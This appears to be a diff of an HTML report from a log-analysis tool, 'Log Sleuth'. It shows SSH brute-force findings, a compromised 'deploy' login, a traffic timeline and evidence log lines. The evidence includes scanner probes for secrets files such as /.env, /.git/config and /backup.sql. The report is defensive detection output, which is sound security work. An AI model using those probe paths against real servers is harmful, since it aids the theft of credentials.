@@ -1,69 +1,288 @@
 <!doctype html>
 <html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
 <title>Log Sleuth report</title><style>
-:root{--bg:#f6f7f9;--card:#fff;--text:#1b1f24;--muted:#5f6b7a;--border:#dde2e8;
---critical:#c62828;--high:#e4572e;--medium:#d99a00;--low:#2c7be5;--mono:ui-monospace,SFMono-Regular,Consolas,monospace}
-@media (prefers-color-scheme:dark){:root{--bg:#0f1318;--card:#171c23;--text:#e6e9ee;--muted:#93a0b0;--border:#2a323d}}
-*{box-sizing:border-box}body{margin:0;background:var(--bg);color:var(--text);font:15px/1.5 system-ui,sans-serif}
-main{max-width:1100px;margin:0 auto;padding:32px 16px}
-h1{margin:0;font-size:26px}h2{font-size:17px;margin:32px 0 12px}.muted{color:var(--muted)}
-.cards{display:grid;grid-template-columns:repeat(auto-fit,minmax(140px,1fr));gap:12px;margin-top:20px}
-.card{background:var(--card);border:1px solid var(--border);border-radius:10px;padding:14px 16px}
-.card b{display:block;font-size:26px}.card.critical b{color:var(--critical)}.card.high b{color:var(--high)}
-.card.medium b{color:var(--medium)}.card.low b{color:var(--low)}
+.report{color-scheme:light;
+--page:#f9f9f7;--card:#fcfcfb;--text:#0b0b0b;--muted:#52514e;--faint:#898781;--border:rgba(11,11,11,.10);
+--grid:#e1e0d9;--axis:#c3c2b7;--hover:rgba(11,11,11,.05);--tip-bg:#0b0b0b;--tip-text:#fff;
+--sev-critical:#d03b3b;--sev-high:#ec835a;--sev-medium:#fab219;--sev-low:#2a78d6;--sev-other:#d6d5ce;
+--ink-critical:#fff;--ink-high:#0b0b0b;--ink-medium:#0b0b0b;--ink-low:#fff;
+--mono:ui-monospace,SFMono-Regular,Consolas,monospace}
+@media (prefers-color-scheme:dark){:root:where(:not([data-theme="light"])) .report{color-scheme:dark;
+--page:#0d0d0d;--card:#1a1a19;--text:#fff;--muted:#c3c2b7;--faint:#898781;--border:rgba(255,255,255,.10);
+--grid:#2c2c2a;--axis:#383835;--hover:rgba(255,255,255,.06);--tip-bg:#fff;--tip-text:#0b0b0b;
+--sev-low:#3987e5;--sev-other:#3a3a37}}
+:root[data-theme="dark"] .report{color-scheme:dark;
+--page:#0d0d0d;--card:#1a1a19;--text:#fff;--muted:#c3c2b7;--faint:#898781;--border:rgba(255,255,255,.10);
+--grid:#2c2c2a;--axis:#383835;--hover:rgba(255,255,255,.06);--tip-bg:#fff;--tip-text:#0b0b0b;
+--sev-low:#3987e5;--sev-other:#3a3a37}
+*{box-sizing:border-box}html,body{margin:0}
+body.report{background:var(--page);color:var(--text);font:15px/1.5 system-ui,-apple-system,"Segoe UI",sans-serif}
+main{max-width:1100px;margin:0 auto;padding:32px 16px 64px}
+h1{margin:0;font-size:26px}h2{font-size:17px;margin:36px 0 12px}.muted{color:var(--muted)}
+code,pre,.ip,.rule{font-family:var(--mono);font-size:13px}.ip{font-weight:600}
+.num,td{font-variant-numeric:tabular-nums}
+.cards{display:grid;grid-template-columns:repeat(auto-fit,minmax(130px,1fr));gap:12px;margin-top:20px}
+.card{background:var(--card);border:1px solid var(--border);border-radius:10px;padding:14px 16px;color:var(--muted)}
+.card b{display:flex;align-items:center;gap:8px;font-size:28px;color:var(--text)}
+.card b::before{content:"";width:10px;height:10px;border-radius:50%;background:var(--sev)}
+.chart,.incident{background:var(--card);border:1px solid var(--border);border-radius:10px;padding:16px;margin:0 0 12px}
+figcaption{color:var(--muted);font-size:13px;margin-bottom:10px}
+.legend{display:flex;flex-wrap:wrap;gap:6px 16px;font-size:13px;color:var(--muted);margin-bottom:12px}
+.legend span{display:inline-flex;align-items:center;gap:6px}.legend i{width:10px;height:10px;border-radius:2px;display:inline-block}
+.tl{display:flex;height:220px}
+.tl-y{position:relative;width:44px;flex:none;font-size:11px;color:var(--faint)}
+.tl-y span{position:absolute;right:8px;transform:translateY(50%)}
+.tl-plot{position:relative;flex:1;display:flex;align-items:stretch;border-bottom:1px solid var(--axis)}
+.grid i{position:absolute;left:0;right:0;border-top:1px solid var(--grid)}
+.col{position:relative;flex:1;display:flex;flex-direction:column-reverse;padding:0 1px;cursor:default}
+.col:hover{background:var(--hover)}
+.col b{display:block;min-height:1px}.col b+b{border-bottom:2px solid var(--card)}
+.col b:last-child{border-radius:3px 3px 0 0}
+.tl-x{position:relative;height:20px;margin-left:44px;font-size:11px;color:var(--faint)}
+.tl-x span{position:absolute;top:4px;white-space:nowrap}
+details{margin-top:10px}summary{cursor:pointer;color:var(--muted);font-size:13px}
+table{width:100%;border-collapse:collapse;margin-top:8px;font-size:13px}
+td,th{text-align:left;padding:6px 10px;border-bottom:1px solid var(--grid)}th{color:var(--muted);font-weight:600}
+.strip{position:relative;height:44px;margin:4px 8px;border-bottom:1px solid var(--axis)}
+.strip i{position:absolute;bottom:0;transform:translateX(-50%)}
+.strip .try{width:3px;height:22px;border-radius:2px 2px 0 0;background:var(--sev-high)}
+.strip .hit{bottom:-7px;width:16px;height:16px;border-radius:50%;background:var(--sev-critical);box-shadow:0 0 0 2px var(--card)}
+.strip i:hover{filter:brightness(1.2)}
+.strip-x{display:flex;justify-content:space-between;font-size:11px;color:var(--faint);margin:10px 0 8px}
+.try-key,.hit-key{display:inline-block;width:10px;height:10px}.try-key{background:var(--sev-high);border-radius:2px}
+.hit-key{background:var(--sev-critical);border-radius:50%}
+.off{display:grid;grid-template-columns:130px 1fr 32px;align-items:center;gap:10px;padding:5px 0}
+.off:hover{background:var(--hover)}
+.off-bar{display:flex;gap:2px;height:14px}.off-bar b{display:block}.off-bar b:last-child{border-radius:0 4px 4px 0}
+.off .num{text-align:right;color:var(--muted)}
+.filters{display:flex;flex-wrap:wrap;gap:8px;margin-bottom:12px}
+.filters label{display:inline-flex;align-items:center;gap:6px;background:var(--card);border:1px solid var(--border);
+border-radius:999px;padding:4px 12px;font-size:13px;cursor:pointer}
 .finding{background:var(--card);border:1px solid var(--border);border-left:5px solid var(--sev);border-radius:10px;padding:14px 16px;margin-bottom:10px}
-.finding header{display:flex;flex-wrap:wrap;gap:8px 14px;align-items:baseline}
-.badge{background:var(--sev);color:#fff;border-radius:4px;padding:1px 8px;font-size:12px;font-weight:700;text-transform:uppercase}
-.rule,.ip,code,pre{font-family:var(--mono);font-size:13px}.ip{font-weight:600}
-details{margin-top:8px}summary{cursor:pointer;color:var(--muted)}
-pre{background:var(--bg);border:1px solid var(--border);border-radius:6px;padding:10px;overflow-x:auto;white-space:pre}
-.bar{display:flex;align-items:center;gap:10px;margin:6px 0}.bar span{font-family:var(--mono);width:140px;flex:none}
-.bar i{display:block;height:12px;border-radius:3px;background:var(--high)}
-table{width:100%;border-collapse:collapse;background:var(--card);border:1px solid var(--border);border-radius:10px;overflow:hidden}
-td,th{text-align:left;padding:8px 12px;border-bottom:1px solid var(--border)}th{color:var(--muted);font-weight:600}
+.finding[hidden]{display:none}
+.finding header{display:flex;flex-wrap:wrap;gap:6px 14px;align-items:baseline}
+.badge{background:var(--sev);color:var(--ink);border-radius:4px;padding:1px 8px;font-size:12px;font-weight:700;text-transform:uppercase}
+pre{background:var(--page);border:1px solid var(--border);border-radius:6px;padding:10px;overflow-x:auto;white-space:pre}
+#tip{position:fixed;z-index:10;pointer-events:none;background:var(--tip-bg);color:var(--tip-text);font-size:12px;
+line-height:1.45;padding:6px 9px;border-radius:6px;white-space:pre-line;max-width:320px}
+@media (max-width:600px){.off{grid-template-columns:110px 1fr 28px}.tl{height:180px}}
 </style></head>
-<body><main>
+<body class="report"><main>
 <h1>Log Sleuth report</h1>
-<p class="muted">Generated 2026-10-11 14:06 &middot; 1,531 lines &middot;
+<p class="muted">Generated 2026-10-11 14:30 &middot; 1,531 lines &middot;
 1,387 security events &middot; log-sleuth v0.1.0</p>
-<div class="cards"><div class="card critical"><b>1</b>critical</div><div class="card high"><b>4</b>high</div><div class="card medium"><b>4</b>medium</div><div class="card low"><b>1</b>low</div></div>
-<h2>Top offenders</h2><div class="bar"><span>203.0.113.99</span><i style="width:60.0%"></i>10</div><div class="bar"><span>192.0.2.150</span><i style="width:36.0%"></i>6</div><div class="bar"><span>203.0.113.200</span><i style="width:36.0%"></i>6</div><div class="bar"><span>203.0.113.42</span><i style="width:24.0%"></i>4</div><div class="bar"><span>192.0.2.201</span><i style="width:24.0%"></i>4</div><div class="bar"><span>192.0.2.77</span><i style="width:12.0%"></i>2</div><div class="bar"><span>198.51.100.66</span><i style="width:6.0%"></i>1</div>
-<h2>Findings</h2><article class="finding" style="--sev:var(--critical)"><header><span class="badge">critical</span><strong>Successful login after brute-force</strong><span class="ip">203.0.113.99</span><span class="rule muted">SSH_COMPROMISE</span><span class="muted">5 events &middot; 2026-10-10 22:42:41 &rarr; 22:43:24</span></header><p>Login accepted for deploy after repeated failures from the same address. Treat the account as compromised.</p><details><summary>Evidence</summary><pre>auth.log:484: Oct 10 22:42:41 web01 sshd[26066]: Failed password for deploy from 203.0.113.99 port 32406 ssh2
+<div class="cards"><div class="card" style="--sev:var(--sev-critical);--ink:var(--ink-critical)"><b>1</b>critical</div><div class="card" style="--sev:var(--sev-high);--ink:var(--ink-high)"><b>4</b>high</div><div class="card" style="--sev:var(--sev-medium);--ink:var(--ink-medium)"><b>4</b>medium</div><div class="card" style="--sev:var(--sev-low);--ink:var(--ink-low)"><b>1</b>low</div></div>
+<h2>Incident reconstruction</h2><figure class="incident">
+<figcaption><span class="ip">203.0.113.99</span> &middot; 12 failed logins in 2 min 10 s, then <strong>access granted</strong> as <code>deploy</code></figcaption>
+<div class="strip"><i class="try" style="left:0.00%" data-tip="22:41:14
+Failed login for deploy
+auth.log:476"></i><i class="try" style="left:7.69%" data-tip="22:41:24
+Failed login for deploy
+auth.log:477"></i><i class="try" style="left:18.46%" data-tip="22:41:38
+Failed login for deploy
+auth.log:478"></i><i class="try" style="left:28.46%" data-tip="22:41:51
+Failed login for deploy
+auth.log:479"></i><i class="try" style="left:37.69%" data-tip="22:42:03
+Failed login for deploy
+auth.log:480"></i><i class="try" style="left:46.15%" data-tip="22:42:14
+Failed login for deploy
+auth.log:481"></i><i class="try" style="left:51.54%" data-tip="22:42:21
+Failed login for deploy
+auth.log:482"></i><i class="try" style="left:62.31%" data-tip="22:42:35
+Failed login for deploy
+auth.log:483"></i><i class="try" style="left:66.92%" data-tip="22:42:41
+Failed login for deploy
+auth.log:484"></i><i class="try" style="left:73.85%" data-tip="22:42:50
+Failed login for deploy
+auth.log:485"></i><i class="try" style="left:81.54%" data-tip="22:43:00
+Failed login for deploy
+auth.log:486"></i><i class="try" style="left:93.08%" data-tip="22:43:15
+Failed login for deploy
+auth.log:487"></i><i class="hit" style="left:100.00%" data-tip="22:43:24
+Login ACCEPTED for deploy
+auth.log:488"></i></div>
+<div class="strip-x"><span>22:41:14</span><span>22:43:24</span></div>
+<div class="legend"><span><i class="try-key"></i>Failed attempt</span><span><i class="hit-key"></i>Successful login</span></div>
+</figure>
+<h2>Activity over time</h2><figure class="chart">
+<figcaption>Events per 30 min, coloured by the most severe finding of their source IP</figcaption>
+<div class="legend"><span><i style="background:var(--sev-critical)"></i>Critical</span><span><i style="background:var(--sev-high)"></i>High</span><span><i style="background:var(--sev-medium)"></i>Medium</span><span><i style="background:var(--sev-low)"></i>Low</span><span><i style="background:var(--sev-other)"></i>Other traffic</span></div>
+<div class="tl"><div class="tl-y"><span style="bottom:0.00%">0</span><span style="bottom:25.00%">100</span><span style="bottom:50.00%">200</span><span style="bottom:75.00%">300</span><span style="bottom:100.00%">400</span></div><div class="tl-plot"><div class="grid"><i style="bottom:0.00%"></i><i style="bottom:25.00%"></i><i style="bottom:50.00%"></i><i style="bottom:75.00%"></i><i style="bottom:100.00%"></i></div><div class="col" data-tip="00:00 - 00:30
+13 events
+Other traffic: 13"><b style="height:3.25%;background:var(--sev-other)"></b></div><div class="col" data-tip="00:30 - 01:00
+16 events
+Other traffic: 16"><b style="height:4.00%;background:var(--sev-other)"></b></div><div class="col" data-tip="01:00 - 01:30
+18 events
+Other traffic: 18"><b style="height:4.50%;background:var(--sev-other)"></b></div><div class="col" data-tip="01:30 - 02:00
+22 events
+Other traffic: 22"><b style="height:5.50%;background:var(--sev-other)"></b></div><div class="col" data-tip="02:00 - 02:30
+20 events
+Other traffic: 20"><b style="height:5.00%;background:var(--sev-other)"></b></div><div class="col" data-tip="02:30 - 03:00
+17 events
+Other traffic: 17"><b style="height:4.25%;background:var(--sev-other)"></b></div><div class="col" data-tip="03:00 - 03:30
+320 events
+High: 300
+Other traffic: 20"><b style="height:5.00%;background:var(--sev-other)"></b><b style="height:75.00%;background:var(--sev-high)"></b></div><div class="col" data-tip="03:30 - 04:00
+22 events
+Other traffic: 22"><b style="height:5.50%;background:var(--sev-other)"></b></div><div class="col" data-tip="04:00 - 04:30
+26 events
+Other traffic: 26"><b style="height:6.50%;background:var(--sev-other)"></b></div><div class="col" data-tip="04:30 - 05:00
+25 events
+Other traffic: 25"><b style="height:6.25%;background:var(--sev-other)"></b></div><div class="col" data-tip="05:00 - 05:30
+21 events
+Other traffic: 21"><b style="height:5.25%;background:var(--sev-other)"></b></div><div class="col" data-tip="05:30 - 06:00
+15 events
+Other traffic: 15"><b style="height:3.75%;background:var(--sev-other)"></b></div><div class="col" data-tip="06:00 - 06:30
+27 events
+Other traffic: 27"><b style="height:6.75%;background:var(--sev-other)"></b></div><div class="col" data-tip="06:30 - 07:00
+21 events
+Low: 3
+Other traffic: 18"><b style="height:4.50%;background:var(--sev-other)"></b><b style="height:0.75%;background:var(--sev-low)"></b></div><div class="col" data-tip="07:00 - 07:30
+25 events
+Other traffic: 25"><b style="height:6.25%;background:var(--sev-other)"></b></div><div class="col" data-tip="07:30 - 08:00
+23 events
+Other traffic: 23"><b style="height:5.75%;background:var(--sev-other)"></b></div><div class="col" data-tip="08:00 - 08:30
+19 events
+Other traffic: 19"><b style="height:4.75%;background:var(--sev-other)"></b></div><div class="col" data-tip="08:30 - 09:00
+27 events
+Other traffic: 27"><b style="height:6.75%;background:var(--sev-other)"></b></div><div class="col" data-tip="09:00 - 09:30
+21 events
+Other traffic: 21"><b style="height:5.25%;background:var(--sev-other)"></b></div><div class="col" data-tip="09:30 - 10:00
+18 events
+Other traffic: 18"><b style="height:4.50%;background:var(--sev-other)"></b></div><div class="col" data-tip="10:00 - 10:30
+15 events
+Other traffic: 15"><b style="height:3.75%;background:var(--sev-other)"></b></div><div class="col" data-tip="10:30 - 11:00
+21 events
+Other traffic: 21"><b style="height:5.25%;background:var(--sev-other)"></b></div><div class="col" data-tip="11:00 - 11:30
+35 events
+Medium: 7
+Other traffic: 28"><b style="height:7.00%;background:var(--sev-other)"></b><b style="height:1.75%;background:var(--sev-medium)"></b></div><div class="col" data-tip="11:30 - 12:00
+18 events
+Other traffic: 18"><b style="height:4.50%;background:var(--sev-other)"></b></div><div class="col" data-tip="12:00 - 12:30
+24 events
+Other traffic: 24"><b style="height:6.00%;background:var(--sev-other)"></b></div><div class="col" data-tip="12:30 - 13:00
+17 events
+Other traffic: 17"><b style="height:4.25%;background:var(--sev-other)"></b></div><div class="col" data-tip="13:00 - 13:30
+25 events
+Other traffic: 25"><b style="height:6.25%;background:var(--sev-other)"></b></div><div class="col" data-tip="13:30 - 14:00
+16 events
+Other traffic: 16"><b style="height:4.00%;background:var(--sev-other)"></b></div><div class="col" data-tip="14:00 - 14:30
+125 events
+High: 112
+Other traffic: 13"><b style="height:3.25%;background:var(--sev-other)"></b><b style="height:28.00%;background:var(--sev-high)"></b></div><div class="col" data-tip="14:30 - 15:00
+22 events
+Other traffic: 22"><b style="height:5.50%;background:var(--sev-other)"></b></div><div class="col" data-tip="15:00 - 15:30
+14 events
+Other traffic: 14"><b style="height:3.50%;background:var(--sev-other)"></b></div><div class="col" data-tip="15:30 - 16:00
+31 events
+Other traffic: 31"><b style="height:7.75%;background:var(--sev-other)"></b></div><div class="col" data-tip="16:00 - 16:30
+15 events
+Other traffic: 15"><b style="height:3.75%;background:var(--sev-other)"></b></div><div class="col" data-tip="16:30 - 17:00
+30 events
+High: 8
+Other traffic: 22"><b style="height:5.50%;background:var(--sev-other)"></b><b style="height:2.00%;background:var(--sev-high)"></b></div><div class="col" data-tip="17:00 - 17:30
+14 events
+Other traffic: 14"><b style="height:3.50%;background:var(--sev-other)"></b></div><div class="col" data-tip="17:30 - 18:00
+20 events
+Other traffic: 20"><b style="height:5.00%;background:var(--sev-other)"></b></div><div class="col" data-tip="18:00 - 18:30
+18 events
+Other traffic: 18"><b style="height:4.50%;background:var(--sev-other)"></b></div><div class="col" data-tip="18:30 - 19:00
+17 events
+Other traffic: 17"><b style="height:4.25%;background:var(--sev-other)"></b></div><div class="col" data-tip="19:00 - 19:30
+13 events
+High: 2
+Other traffic: 11"><b style="height:2.75%;background:var(--sev-other)"></b><b style="height:0.50%;background:var(--sev-high)"></b></div><div class="col" data-tip="19:30 - 20:00
+15 events
+Other traffic: 15"><b style="height:3.75%;background:var(--sev-other)"></b></div><div class="col" data-tip="20:00 - 20:30
+22 events
+Other traffic: 22"><b style="height:5.50%;background:var(--sev-other)"></b></div><div class="col" data-tip="20:30 - 21:00
+26 events
+Other traffic: 26"><b style="height:6.50%;background:var(--sev-other)"></b></div><div class="col" data-tip="21:00 - 21:30
+12 events
+Other traffic: 12"><b style="height:3.00%;background:var(--sev-other)"></b></div><div class="col" data-tip="21:30 - 22:00
+14 events
+Other traffic: 14"><b style="height:3.50%;background:var(--sev-other)"></b></div><div class="col" data-tip="22:00 - 22:30
+19 events
+Other traffic: 19"><b style="height:4.75%;background:var(--sev-other)"></b></div><div class="col" data-tip="22:30 - 23:00
+36 events
+Critical: 13
+Other traffic: 23"><b style="height:5.75%;background:var(--sev-other)"></b><b style="height:3.25%;background:var(--sev-critical)"></b></div><div class="col" data-tip="23:00 - 23:30
+24 events
+Other traffic: 24"><b style="height:6.00%;background:var(--sev-other)"></b></div><div class="col" data-tip="23:30 - 00:00
+13 events
+Other traffic: 13"><b style="height:3.25%;background:var(--sev-other)"></b></div></div></div>
+<div class="tl-x"><span style="left:0.00%">00:00</span><span style="left:16.67%">04:00</span><span style="left:33.33%">08:00</span><span style="left:50.00%">12:00</span><span style="left:66.67%">16:00</span><span style="left:83.33%">20:00</span></div>
+<details><summary>Data table</summary><table><thead><tr><th>Time</th><th>Total</th><th>Critical</th><th>High</th><th>Medium</th><th>Low</th><th>Other traffic</th></tr></thead>
+<tbody><tr><td>00:00</td><td>13</td><td>0</td><td>0</td><td>0</td><td>0</td><td>13</td></tr><tr><td>00:30</td><td>16</td><td>0</td><td>0</td><td>0</td><td>0</td><td>16</td></tr><tr><td>01:00</td><td>18</td><td>0</td><td>0</td><td>0</td><td>0</td><td>18</td></tr><tr><td>01:30</td><td>22</td><td>0</td><td>0</td><td>0</td><td>0</td><td>22</td></tr><tr><td>02:00</td><td>20</td><td>0</td><td>0</td><td>0</td><td>0</td><td>20</td></tr><tr><td>02:30</td><td>17</td><td>0</td><td>0</td><td>0</td><td>0</td><td>17</td></tr><tr><td>03:00</td><td>320</td><td>0</td><td>300</td><td>0</td><td>0</td><td>20</td></tr><tr><td>03:30</td><td>22</td><td>0</td><td>0</td><td>0</td><td>0</td><td>22</td></tr><tr><td>04:00</td><td>26</td><td>0</td><td>0</td><td>0</td><td>0</td><td>26</td></tr><tr><td>04:30</td><td>25</td><td>0</td><td>0</td><td>0</td><td>0</td><td>25</td></tr><tr><td>05:00</td><td>21</td><td>0</td><td>0</td><td>0</td><td>0</td><td>21</td></tr><tr><td>05:30</td><td>15</td><td>0</td><td>0</td><td>0</td><td>0</td><td>15</td></tr><tr><td>06:00</td><td>27</td><td>0</td><td>0</td><td>0</td><td>0</td><td>27</td></tr><tr><td>06:30</td><td>21</td><td>0</td><td>0</td><td>0</td><td>3</td><td>18</td></tr><tr><td>07:00</td><td>25</td><td>0</td><td>0</td><td>0</td><td>0</td><td>25</td></tr><tr><td>07:30</td><td>23</td><td>0</td><td>0</td><td>0</td><td>0</td><td>23</td></tr><tr><td>08:00</td><td>19</td><td>0</td><td>0</td><td>0</td><td>0</td><td>19</td></tr><tr><td>08:30</td><td>27</td><td>0</td><td>0</td><td>0</td><td>0</td><td>27</td></tr><tr><td>09:00</td><td>21</td><td>0</td><td>0</td><td>0</td><td>0</td><td>21</td></tr><tr><td>09:30</td><td>18</td><td>0</td><td>0</td><td>0</td><td>0</td><td>18</td></tr><tr><td>10:00</td><td>15</td><td>0</td><td>0</td><td>0</td><td>0</td><td>15</td></tr><tr><td>10:30</td><td>21</td><td>0</td><td>0</td><td>0</td><td>0</td><td>21</td></tr><tr><td>11:00</td><td>35</td><td>0</td><td>0</td><td>7</td><td>0</td><td>28</td></tr><tr><td>11:30</td><td>18</td><td>0</td><td>0</td><td>0</td><td>0</td><td>18</td></tr><tr><td>12:00</td><td>24</td><td>0</td><td>0</td><td>0</td><td>0</td><td>24</td></tr><tr><td>12:30</td><td>17</td><td>0</td><td>0</td><td>0</td><td>0</td><td>17</td></tr><tr><td>13:00</td><td>25</td><td>0</td><td>0</td><td>0</td><td>0</td><td>25</td></tr><tr><td>13:30</td><td>16</td><td>0</td><td>0</td><td>0</td><td>0</td><td>16</td></tr><tr><td>14:00</td><td>125</td><td>0</td><td>112</td><td>0</td><td>0</td><td>13</td></tr><tr><td>14:30</td><td>22</td><td>0</td><td>0</td><td>0</td><td>0</td><td>22</td></tr><tr><td>15:00</td><td>14</td><td>0</td><td>0</td><td>0</td><td>0</td><td>14</td></tr><tr><td>15:30</td><td>31</td><td>0</td><td>0</td><td>0</td><td>0</td><td>31</td></tr><tr><td>16:00</td><td>15</td><td>0</td><td>0</td><td>0</td><td>0</td><td>15</td></tr><tr><td>16:30</td><td>30</td><td>0</td><td>8</td><td>0</td><td>0</td><td>22</td></tr><tr><td>17:00</td><td>14</td><td>0</td><td>0</td><td>0</td><td>0</td><td>14</td></tr><tr><td>17:30</td><td>20</td><td>0</td><td>0</td><td>0</td><td>0</td><td>20</td></tr><tr><td>18:00</td><td>18</td><td>0</td><td>0</td><td>0</td><td>0</td><td>18</td></tr><tr><td>18:30</td><td>17</td><td>0</td><td>0</td><td>0</td><td>0</td><td>17</td></tr><tr><td>19:00</td><td>13</td><td>0</td><td>2</td><td>0</td><td>0</td><td>11</td></tr><tr><td>19:30</td><td>15</td><td>0</td><td>0</td><td>0</td><td>0</td><td>15</td></tr><tr><td>20:00</td><td>22</td><td>0</td><td>0</td><td>0</td><td>0</td><td>22</td></tr><tr><td>20:30</td><td>26</td><td>0</td><td>0</td><td>0</td><td>0</td><td>26</td></tr><tr><td>21:00</td><td>12</td><td>0</td><td>0</td><td>0</td><td>0</td><td>12</td></tr><tr><td>21:30</td><td>14</td><td>0</td><td>0</td><td>0</td><td>0</td><td>14</td></tr><tr><td>22:00</td><td>19</td><td>0</td><td>0</td><td>0</td><td>0</td><td>19</td></tr><tr><td>22:30</td><td>36</td><td>13</td><td>0</td><td>0</td><td>0</td><td>23</td></tr><tr><td>23:00</td><td>24</td><td>0</td><td>0</td><td>0</td><td>0</td><td>24</td></tr><tr><td>23:30</td><td>13</td><td>0</td><td>0</td><td>0</td><td>0</td><td>13</td></tr></tbody></table></details>
+</figure>
+<h2>Top offenders</h2><figure class="chart">
+<figcaption>Threat score per IP (critical = 8, high = 4, medium = 2, low = 1)</figcaption>
+<div class="legend"><span><i style="background:var(--sev-critical)"></i>Critical</span><span><i style="background:var(--sev-high)"></i>High</span><span><i style="background:var(--sev-medium)"></i>Medium</span><span><i style="background:var(--sev-low)"></i>Low</span></div><div class="off" data-tip="203.0.113.99
+Score 10
+CRITICAL  SSH_COMPROMISE
+MEDIUM  SSH_BRUTE_FORCE"><span class="ip">203.0.113.99</span><div class="off-bar"><b style="width:80.00%;background:var(--sev-critical)"></b><b style="width:20.00%;background:var(--sev-medium)"></b></div><span class="num">10</span></div><div class="off" data-tip="192.0.2.150
+Score 6
+HIGH  WEB_SENSITIVE_EXPOSED
+MEDIUM  WEB_SCANNER"><span class="ip">192.0.2.150</span><div class="off-bar"><b style="width:40.00%;background:var(--sev-high)"></b><b style="width:20.00%;background:var(--sev-medium)"></b></div><span class="num">6</span></div><div class="off" data-tip="203.0.113.200
+Score 6
+HIGH  WEB_INJECTION
+MEDIUM  WEB_SCANNER"><span class="ip">203.0.113.200</span><div class="off-bar"><b style="width:40.00%;background:var(--sev-high)"></b><b style="width:20.00%;background:var(--sev-medium)"></b></div><span class="num">6</span></div><div class="off" data-tip="192.0.2.201
+Score 4
+HIGH  WEB_INJECTION"><span class="ip">192.0.2.201</span><div class="off-bar"><b style="width:40.00%;background:var(--sev-high)"></b></div><span class="num">4</span></div><div class="off" data-tip="203.0.113.42
+Score 4
+HIGH  SSH_BRUTE_FORCE"><span class="ip">203.0.113.42</span><div class="off-bar"><b style="width:40.00%;background:var(--sev-high)"></b></div><span class="num">4</span></div><div class="off" data-tip="192.0.2.77
+Score 2
+MEDIUM  SSH_USER_ENUM"><span class="ip">192.0.2.77</span><div class="off-bar"><b style="width:20.00%;background:var(--sev-medium)"></b></div><span class="num">2</span></div><div class="off" data-tip="198.51.100.66
+Score 1
+LOW  WEB_SENSITIVE_PROBE"><span class="ip">198.51.100.66</span><div class="off-bar"><b style="width:10.00%;background:var(--sev-low)"></b></div><span class="num">1</span></div>
+</figure>
+<h2>Findings</h2><div class="filters"><label><input type="checkbox" value="critical" checked> critical (1)</label><label><input type="checkbox" value="high" checked> high (4)</label><label><input type="checkbox" value="medium" checked> medium (4)</label><label><input type="checkbox" value="low" checked> low (1)</label></div><article class="finding" data-sev="critical" style="--sev:var(--sev-critical);--ink:var(--ink-critical)"><header><span class="badge">critical</span><strong>Successful login after brute-force</strong><span class="ip">203.0.113.99</span><span class="rule muted">SSH_COMPROMISE</span><span class="muted">13 events &middot; 2026-10-10 22:41:14 &rarr; 22:43:24</span></header><p>Login accepted for deploy after repeated failures from the same address. Treat the account as compromised.</p><details><summary>Evidence</summary><pre>auth.log:484: Oct 10 22:42:41 web01 sshd[26066]: Failed password for deploy from 203.0.113.99 port 32406 ssh2
 auth.log:485: Oct 10 22:42:50 web01 sshd[24460]: Failed password for deploy from 203.0.113.99 port 31306 ssh2
 auth.log:486: Oct 10 22:43:00 web01 sshd[41904]: Failed password for deploy from 203.0.113.99 port 36714 ssh2
 auth.log:487: Oct 10 22:43:15 web01 sshd[64428]: Failed password for deploy from 203.0.113.99 port 35497 ssh2
-auth.log:488: Oct 10 22:43:24 web01 sshd[39454]: Accepted password for deploy from 203.0.113.99 port 51515 ssh2</pre></details></article><article class="finding" style="--sev:var(--high)"><header><span class="badge">high</span><strong>SSH brute-force</strong><span class="ip">203.0.113.42</span><span class="rule muted">SSH_BRUTE_FORCE</span><span class="muted">300 events &middot; 2026-10-10 03:14:01 &rarr; 03:22:32</span></header><p>300 failed logins, peak of 186 within 5 min. Most targeted: root, admin.</p><details><summary>Evidence</summary><pre>auth.log:20: Oct 10 03:14:01 web01 sshd[33863]: Failed password for root from 203.0.113.42 port 37323 ssh2
+auth.log:488: Oct 10 22:43:24 web01 sshd[39454]: Accepted password for deploy from 203.0.113.99 port 51515 ssh2</pre></details></article><article class="finding" data-sev="high" style="--sev:var(--sev-high);--ink:var(--ink-high)"><header><span class="badge">high</span><strong>SSH brute-force</strong><span class="ip">203.0.113.42</span><span class="rule muted">SSH_BRUTE_FORCE</span><span class="muted">300 events &middot; 2026-10-10 03:14:01 &rarr; 03:22:32</span></header><p>300 failed logins, peak of 186 within 5 min. Most targeted: root, admin.</p><details><summary>Evidence</summary><pre>auth.log:20: Oct 10 03:14:01 web01 sshd[33863]: Failed password for root from 203.0.113.42 port 37323 ssh2
 auth.log:21: Oct 10 03:14:02 web01 sshd[63902]: Failed password for root from 203.0.113.42 port 43930 ssh2
 auth.log:22: Oct 10 03:14:05 web01 sshd[47783]: Failed password for root from 203.0.113.42 port 33417 ssh2
 auth.log:23: Oct 10 03:14:08 web01 sshd[4388]: Failed password for root from 203.0.113.42 port 39224 ssh2
-auth.log:24: Oct 10 03:14:11 web01 sshd[55217]: Failed password for admin from 203.0.113.42 port 42018 ssh2</pre></details></article><article class="finding" style="--sev:var(--high)"><header><span class="badge">high</span><strong>Sensitive file served</strong><span class="ip">192.0.2.150</span><span class="rule muted">WEB_SENSITIVE_EXPOSED</span><span class="muted">40 events &middot; 2026-10-10 14:05:05 &rarr; 14:05:27</span></header><p>The server answered 2xx for: /.git/config. Probed: /.env, /.git/config, /actuator/health, /backup.sql, /cgi-bin/test.cgi, /config.php (+4 more).</p><details><summary>Evidence</summary><pre>access.log:583: 192.0.2.150 - - [10/Oct/2026:14:05:05 +0200] &quot;GET /.git/config HTTP/1.1&quot; 200 12958 &quot;-&quot; &quot;gobuster/3.6&quot;
+auth.log:24: Oct 10 03:14:11 web01 sshd[55217]: Failed password for admin from 203.0.113.42 port 42018 ssh2</pre></details></article><article class="finding" data-sev="high" style="--sev:var(--sev-high);--ink:var(--ink-high)"><header><span class="badge">high</span><strong>Sensitive file served</strong><span class="ip">192.0.2.150</span><span class="rule muted">WEB_SENSITIVE_EXPOSED</span><span class="muted">40 events &middot; 2026-10-10 14:05:05 &rarr; 14:05:27</span></header><p>The server answered 2xx for: /.git/config. Probed: /.env, /.git/config, /actuator/health, /backup.sql, /cgi-bin/test.cgi, /config.php (+4 more).</p><details><summary>Evidence</summary><pre>access.log:583: 192.0.2.150 - - [10/Oct/2026:14:05:05 +0200] &quot;GET /.git/config HTTP/1.1&quot; 200 12958 &quot;-&quot; &quot;gobuster/3.6&quot;
